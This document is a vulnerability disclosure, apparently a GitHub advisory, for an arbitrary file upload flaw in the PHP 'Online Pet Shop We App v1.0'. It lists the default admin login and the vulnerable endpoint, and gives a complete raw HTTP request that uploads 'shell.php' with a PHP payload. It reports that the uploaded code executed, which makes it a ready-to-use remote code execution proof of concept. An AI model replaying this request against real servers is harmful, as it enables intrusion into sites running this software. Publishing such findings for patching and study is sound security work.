# Online Pet Shop We App v1.0 by oretnom23 has arbitrary code execution (RCE)

BUG_Author: z1pwn

Admind login account: admin/admin123

vendor: https://www.sourcecodester.com/php/14839/online-pet-shop-we-app-using-php-and-paypal-free-source-code.html

Vulnerability url: http://ip/pet_shop/classes/Master.php?f=save_product

Loophole location：There is an arbitrary file upload vulnerability (RCE) in the picture upload point of the editing function of the product list module in the background management system

Request package for file upload：

```sql
POST /pet_shop/classes/Master.php?f=save_product HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/pet_shop/admin/?page=product/manage_product&id=6
Content-Length: 2685
Content-Type: multipart/form-data; boundary=---------------------------162223033527413
Cookie: PHPSESSID=k8u390ikl968phg971gmpmhtj5
Connection: close

-----------------------------162223033527413
Content-Disposition: form-data; name="id"

6
-----------------------------162223033527413
Content-Disposition: form-data; name="category_id"

4
-----------------------------162223033527413
Content-Disposition: form-data; name="sub_category_id"

4
-----------------------------162223033527413
Content-Disposition: form-data; name="product_name"

Dog Belt
-----------------------------162223033527413
Content-Disposition: form-data; name="description"

<p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Lorem ipsum dolor sit amet, consectetur adipiscing elit. Maecenas dui nulla, tincidunt in arcu at, vulputate volutpat velit. Quisque volutpat gravida erat, gravida porttitor magna malesuada sed. Curabitur massa est, ullamcorper a diam vitae, tincidunt sagittis justo. Nam eu orci ligula. Duis ullamcorper dui at nisi consequat, sed suscipit sapien lacinia. Praesent ut lacus id arcu bibendum egestas. Cras ullamcorper dictum mi, non commodo mauris iaculis a. Pellentesque porta sem id dapibus tincidunt. Aenean metus tellus, efficitur ut feugiat in, euismod et arcu. In pharetra, dolor in fermentum facilisis, metus urna lacinia metus, in maximus justo tellus et tortor. Nam pulvinar eu enim auctor pellentesque.</p><p style="margin-right: 0px; margin-bottom: 15px; margin-left: 0px; padding: 0px;">Nam ut quam velit. Suspendisse commodo non urna nec dictum. Pellentesque eget enim id velit bibendum auctor vel id lectus. Maecenas dolor nibh, ultricies eget metus vel, efficitur varius tellus. Donec semper eros sit amet urna bibendum scelerisque. Interdum et malesuada fames ac ante ipsum primis in faucibus. Integer cursus est in sapien sodales, quis pulvinar nisl aliquet. Pellentesque blandit diam lobortis pulvinar ornare. Sed venenatis imperdiet massa, ut mollis sapien sagittis a. Nulla dignissim ultrices metus a mattis. Nunc egestas mattis nisl at posuere. Donec malesuada ut justo sed aliquam. Sed venenatis sit amet tortor et semper. Class aptent taciti sociosqu ad litora torquent per conubia nostra, per inceptos himenaeos. Vivamus sit amet massa at massa malesuada volutpat quis nec libero.</p>
-----------------------------162223033527413
Content-Disposition: form-data; name="files"; filename=""
Content-Type: application/octet-stream


-----------------------------162223033527413
Content-Disposition: form-data; name="status"

1
-----------------------------162223033527413
Content-Disposition: form-data; name="img[]"; filename="shell.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------162223033527413--
```

The files will be uploaded to this directory \pet_shop\uploads\product_6
![image](https://user-images.githubusercontent.com/54017627/185289578-eafb55c4-282e-4a3b-9201-3df076710a7c.png)


We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/185289496-bade6640-f6b4-4822-8160-0ff82cf06579.png)
